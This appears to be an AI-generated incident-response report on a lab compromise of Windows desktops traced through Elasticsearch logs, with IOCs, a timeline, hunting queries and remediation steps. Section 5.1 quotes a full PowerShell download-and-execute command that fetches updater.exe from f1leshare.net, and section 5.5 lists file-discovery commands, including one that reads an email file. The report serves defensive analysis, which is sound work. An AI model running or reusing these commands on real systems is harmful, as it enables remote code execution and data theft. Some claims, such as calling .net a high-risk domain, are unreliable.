# Elasticsearch Security Investigation Findings

**Investigation Date:** April 25, 2026  
**Data Time Range:** March 29, 2026  
**Analyst:** Elasticsearch MCP Analyst

---

## 1. Summary of Discovered Indices

| Index | Purpose | Document Count |
|-------|---------|----------------|
| `.internal.alerts-security.alerts-default-000001` | Security alerts (SIEM) | 31 |
| `.ds-logs-endpoint.events.process-default-2026.03.29-000001` | Endpoint process events | 1,805 |
| `.ds-logs-endpoint.events.network-default-2026.03.29-000001` | Endpoint network events | 3,097 |
| `.ds-logs-endpoint.events.file-default-2026.03.29-000001` | Endpoint file events | 11,650 |
| `.ds-logs-endpoint.events.registry-default-2026.03.29-000001` | Endpoint registry events | 1,502 |
| `.ds-logs-endpoint.events.security-default-2026.03.29-000001` | Endpoint security events | 193 |
| `.ds-logs-endpoint.events.api-default-2026.03.29-000001` | Endpoint API events | 452 |
| `.ds-logs-endpoint.events.library-default-2026.03.29-000001` | Endpoint library events | 1,972 |
| `.ds-logs-network_traffic.http-default-2026.03.29-000001` | HTTP network traffic | 493 |
| `.ds-logs-network_traffic.dns-default-2026.03.29-000001` | DNS traffic | 1,857 |
| `.ds-logs-network_traffic.tls-default-2026.03.29-000001` | TLS traffic | 661 |
| `.ds-logs-windows.sysmon_operational-default-2026.03.29-000001` | Sysmon events | 1,668 |
| `.ds-logs-system.security-default-2026.03.29-000001` | Windows security logs | 497 |

**Hosts Monitored:**
- anders-desktop (10.3.10.21)
- john-desktop (10.3.10.22)
- emil-desktop (10.3.10.23)

---

## 2. CRITICAL IOCs IDENTIFIED

### 2.1 Malicious Domain: f1leshare.net

**Description:** Typosquatting domain used to distribute malware (resembles "fileshare.net")

**Query:**
```esql
FROM .ds-logs-endpoint.events.network-default-2026.03.29-000001
| WHERE destination.domain == "f1leshare.net"
| STATS query_count = COUNT(*) BY host.name
```

**Results:**
- anders-desktop: 12 DNS queries
- john-desktop: 12 DNS queries

**Suspicious Indicators:**
- Typosquatting pattern ("f1le" instead of "file")
- Used to download executable payload
- Associated with high-risk TLD (.net)

---

### 2.2 Malicious Binary: updater.exe

**Description:** Malicious executable downloaded and executed on multiple hosts

**File Hashes:**
| Hash Type | Value |
|-----------|-------|
| SHA256 | `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` |
| MD5 | (not available in logs) |

**File Locations:**
- `C:\Users\anders\AppData\Local\Temp\updater.exe`
- `C:\Users\anders\AppData\Local\Microsoft\updater.exe`
- `C:\Users\john\AppData\Local\Temp\updater.exe`
- `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`

**Query:**
```json
GET .ds-logs-endpoint.events.file-default-2026.03.29-000001/_search
{
  "query": {
    "bool": {
      "should": [
        {"term": {"file.name": "updater.exe"}},
        {"term": {"process.name": "updater.exe"}}
      ]
    }
  }
}
```

**Results:** 5 file events showing creation and modification of updater.exe

**Suspicious Indicators:**
- Unsigned binary (code_signature.exists: false)
- Masquerades as legitimate Microsoft updater
- Copies itself to multiple locations including Startup folder
- Creates persistence via Registry Run key

---

### 2.3 C2 Domains

**Domain 1: miccosoftupdate.com**
- Typosquatting of "microsoftupdate.com"
- Resolved to: 10.3.97.182
- Queried by: updater.exe process

**Domain 2: windowsupdater.tk**
- Suspicious TLD (.tk is frequently abused)
- Resolved to: 10.3.215.83
- Queried by: updater.exe process

**Query:**
```esql
FROM .ds-logs-endpoint.events.network-default-2026.03.29-000001
| WHERE process.name == "updater.exe" AND network.protocol == "dns"
| KEEP @timestamp, host.name, dns.question.name, dns.resolved_ip
```

**Results:**
| Timestamp | Host | Domain | Resolved IP |
|-----------|------|--------|-------------|
| 2026-03-29T17:47:22.268Z | anders-desktop | miccosoftupdate.com | 10.3.97.182 |
| 2026-03-29T17:47:52.310Z | anders-desktop | windowsupdater.tk | 10.3.215.83 |

---

### 2.4 C2 IP Addresses

| IP Address | Port | Associated Domain | Process |
|------------|------|-------------------|---------|
| 10.3.97.182 | 80 | miccosoftupdate.com | updater.exe |
| 10.3.215.83 | 80 | windowsupdater.tk | updater.exe |

**Note:** Both IPs are internal/private range (10.3.x.x), suggesting internal C2 infrastructure or redirectors.

---

## 3. TIMELINE OF SUSPICIOUS ACTIVITIES

### March 29, 2026 - Attack Timeline

| Time (UTC) | Host | Event | MITRE ATT&CK |
|------------|------|-------|--------------|
| 17:46:55 | anders-desktop | PowerShell execution with suspicious arguments - downloads updater.exe from f1leshare.net | T1059.001, T1105 |
| 17:47:11 | anders-desktop | updater.exe created in Temp folder (88,576 bytes) | - |
| 17:47:20 | anders-desktop | updater.exe process started (PID 12276) | T1204.002 |
| 17:47:21 | anders-desktop | updater.exe copied to `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | T1036.005 |
| 17:47:21 | anders-desktop | Registry persistence created: `HKCU\...\Run\MicrosoftUpdater` | T1547.001 |
| 17:47:21 | anders-desktop | File created in Startup folder: `msteamsupdater.exe` | T1547.001 |
| 17:47:22 | anders-desktop | DNS query to miccosoftupdate.com | - |
| 17:47:22 | anders-desktop | Network connection to 10.3.97.182:80 | T1071 |
| 17:47:45 | john-desktop | PowerShell execution - same payload | T1059.001, T1105 |
| 17:47:52 | anders-desktop | DNS query to windowsupdater.tk | - |
| 17:47:52 | anders-desktop | Network connection to 10.3.215.83:80 | T1071 |
| 17:48:22 | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users"` | T1083 |
| 17:49:09 | john-desktop | updater.exe created in Temp folder | - |
| 17:49:12 | john-desktop | updater.exe process started | T1204.002 |
| 17:49:22 | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users\anders\Documents"` | T1083 |
| 17:50:53 | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users\anders\Desktop"` | T1083 |
| 17:51:53 | anders-desktop | **Data access: `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"`** | T1083, T1005 |

---

## 4. SECURITY ALERTS TRIGGERED

| Alert Name | Risk Score | Count | Hosts |
|------------|------------|-------|-------|
| Suspicious Windows Powershell Arguments | 47 (Medium) | 4 | anders-desktop, john-desktop |
| Remote File Download via PowerShell | 47 (Medium) | 6 | anders-desktop, john-desktop |
| Network Activity to a Suspicious Top Level Domain | 73 (High) | 3 | anders-desktop |
| System Information Discovery via Windows Command Shell | 21 (Low) | 6 | anders-desktop |
| Unusual Discovery Signal Alert with Unusual Process Command Line | 21 (Low) | 6 | anders-desktop |
| Deprecated - Unusual Discovery Activity by User | 21 (Low) | 2 | anders-desktop |
| First Time Seen Driver Loaded | 47 (Medium) | 4 | anders-desktop |

**Query:**
```esql
FROM .internal.alerts-security.alerts-default-000001
| STATS alert_count = COUNT(*) BY kibana.alert.rule.name, kibana.alert.risk_score, host.name
| SORT kibana.alert.risk_score DESC
```

---

## 5. ATTACK PATTERN ANALYSIS

### 5.1 Initial Access
- **Vector:** PowerShell execution with malicious command
- **Command:** `"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"`
- **Technique:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)

### 5.2 Execution
- **Method:** Direct execution of downloaded binary
- **Parent Process:** powershell.exe
- **Child Process:** updater.exe
- **Technique:** T1204.002 (User Execution - Malicious File)

### 5.3 Persistence
Two persistence mechanisms identified:

1. **Registry Run Key:**
   - Path: `HKEY_USERS\...\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
   - Value: `C:\Users\anders\AppData\Local\Microsoft\updater.exe`
   - Technique: T1547.001 (Registry Run Keys)

2. **Startup Folder:**
   - Path: `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
   - Technique: T1547.001 (Registry Run Keys / Startup Folder)

### 5.4 Defense Evasion
- **Masquerading:** Binary named "updater.exe" and "msteamsupdater.exe" to appear legitimate
- **Code Signing:** Initial PowerShell execution used valid Microsoft signature
- **Technique:** T1036.005 (Match Legitimate Name or Location)

### 5.5 Discovery
Multiple discovery commands executed by updater.exe:
```
cmd.exe /c dir "C:\Users"
cmd.exe /c dir "C:\Users\anders\Documents"
cmd.exe /c dir "C:\Users\anders\Desktop"
cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"
```
- **Technique:** T1083 (File and Directory Discovery)

### 5.6 Command and Control
- **Domains:** miccosoftupdate.com, windowsupdater.tk
- **IPs:** 10.3.97.182, 10.3.215.83
- **Port:** 80 (HTTP)
- **Technique:** T1071 (Application Layer Protocol)

### 5.7 Collection/Exfiltration
- **File Accessed:** `C:\Users\anders\Desktop\polen.eml`
- **Technique:** T1005 (Data from Local System)

---

## 6. AFFECTED HOSTS SUMMARY

### anders-desktop (10.3.10.21)
- **Status:** COMPROMISED
- **User:** anders
- **Initial Compromise:** 2026-03-29T17:46:55Z
- **Activities:**
  - PowerShell payload execution
  - updater.exe downloaded and executed
  - Persistence established (Registry + Startup)
  - C2 communications to miccosoftupdate.com and windowsupdater.tk
  - File discovery and data access (polen.eml)

### john-desktop (10.3.10.22)
- **Status:** COMPROMISED
- **User:** john
- **Initial Compromise:** 2026-03-29T17:47:45Z
- **Activities:**
  - PowerShell payload execution
  - updater.exe downloaded and executed
  - Limited visibility on post-exploitation activities

### emil-desktop (10.3.10.23)
- **Status:** NO MALICIOUS ACTIVITY OBSERVED
- **User:** emil
- **Activities:** Normal system activity only

---

## 7. GAPS AND AREAS NEEDING FURTHER INVESTIGATION

### 7.1 Binary Analysis Required
- **File:** updater.exe (SHA256: 254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d)
- **Action:** Reverse engineer to identify:
  - Full C2 communication protocol
  - Additional capabilities (keylogging, screenshot, etc.)
  - Encryption methods
  - Additional IOCs (embedded domains, IPs, mutexes)

### 7.2 Network Traffic Analysis
- HTTP traffic content to C2 IPs not fully captured
- Need packet capture (PCAP) analysis for:
  - Exfiltrated data content
  - C2 command structure
  - Additional C2 endpoints

### 7.3 Memory Forensics
- No memory dumps available
- Could reveal:
  - In-memory payloads
  - Decrypted C2 communications
  - Process injection activities

### 7.4 Email Analysis
- File `polen.eml` was accessed by malicious process
- Need to analyze:
  - Email content and attachments
  - Potential phishing vector
  - Sender information

### 7.5 Lateral Movement Investigation
- Check for:
  - SMB/RDP connections between hosts
  - Credential dumping attempts
  - Pass-the-hash activities
  - WMI/PowerShell remoting

### 7.6 Additional Host Investigation
- john-desktop: Limited visibility on post-exploitation
- Check for:
  - Registry persistence on john-desktop
  - Startup folder entries
  - Additional file creations

---

## 8. QUERIES FOR FURTHER HUNTING

### Find all updater.exe executions
```esql
FROM .ds-logs-endpoint.events.process-default-2026.03.29-000001
| WHERE process.name == "updater.exe"
| KEEP @timestamp, host.name, user.name, process.command_line, process.hash.sha256
| SORT @timestamp ASC
```

### Find all C2 communications
```esql
FROM .ds-logs-endpoint.events.network-default-2026.03.29-000001
| WHERE process.name == "updater.exe" AND network.direction == "egress"
| KEEP @timestamp, host.name, destination.ip, destination.port, destination.domain
| SORT @timestamp ASC
```

### Find persistence mechanisms
```esql
FROM .ds-logs-endpoint.events.registry-default-2026.03.29-000001
| WHERE registry.path LIKE "*Run*" AND registry.data.strings LIKE "*updater*"
| KEEP @timestamp, host.name, registry.path, registry.data.strings, process.name
```

### Find all discovery commands
```esql
FROM .ds-logs-endpoint.events.process-default-2026.03.29-000001
| WHERE process.parent.name == "updater.exe" AND process.name == "cmd.exe"
| KEEP @timestamp, host.name, process.command_line
| SORT @timestamp ASC
```

---

## 9. RECOMMENDATIONS

### Immediate Actions
1. **Isolate** anders-desktop and john-desktop from network
2. **Block** domains: f1leshare.net, miccosoftupdate.com, windowsupdater.tk
3. **Block** IPs: 10.3.97.182, 10.3.215.83
4. **Delete** files:
   - `C:\Users\*\AppData\Local\Temp\updater.exe`
   - `C:\Users\*\AppData\Local\Microsoft\updater.exe`
   - `C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
5. **Remove** registry entries:
   - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`

### Long-term Actions
1. Conduct full forensic imaging of compromised hosts
2. Analyze updater.exe binary in sandbox/Ghidra
3. Review email logs for phishing campaign indicators
4. Implement application whitelisting
5. Enable PowerShell Constrained Language Mode
6. Deploy additional monitoring for the identified IOCs

---

**End of Report**
